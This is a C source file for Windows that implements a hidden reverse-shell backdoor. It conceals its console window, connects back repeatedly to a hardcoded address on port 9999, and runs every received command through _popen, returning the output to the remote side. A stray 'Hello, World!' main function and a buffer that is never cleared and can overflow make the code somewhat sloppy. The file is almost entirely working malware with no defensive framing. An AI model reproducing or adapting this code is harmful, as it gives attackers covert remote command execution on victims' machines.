#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <wininet.h>
#include <windows.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p),0, (size))

int sock;

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1) {
        jump:
        bzero(buffer,sizeof(buffer));
        bzero(container,sizeof(container));
        bzero(buffer,sizeof(buffer));
        recv(sock, buffer, 1024,0);

        // string comapre
        if (strncmp("q", buffer,1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else {
            FILE *fp;
            fp = _popen(buffer, "r");
            while (fgets(container,1024,fp) != NULL){
                strcat(total_response, container);
            }
            send(sock,total_response,sizeof(total_response),0);
            fclose(fp);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    // create a stealth handler so that the cmd is not visible
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);

    // create a socket object that connects back to server

    struct sockaddr_in ServAddr;
    unsigned short ServerPort;
    char *ServerIP;
    WSADATA wsadata; // a structure that contains information about windows socket

    ServerIP = "192.168.64.128";
    ServerPort = 9999;

    if (WSAStartup(MAKEWORD(2,0), &wsadata) != 0){
        exit(1);
    }

    // af_inet : means the connection is over ipv4
    // SOCK_STREAM : means we are using TCP
    sock = socket(AF_INET, SOCK_STREAM,0);

    // memset clears the variable with zeroes
    memset(&ServAddr,0,sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServerIP);
    ServAddr.sin_port = htons(ServerPort);

    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0 ){
        Sleep(10);
        goto start;
    }
    Shell();
}

int main() {
    printf("Hello, World!\n");
    return 0;
}
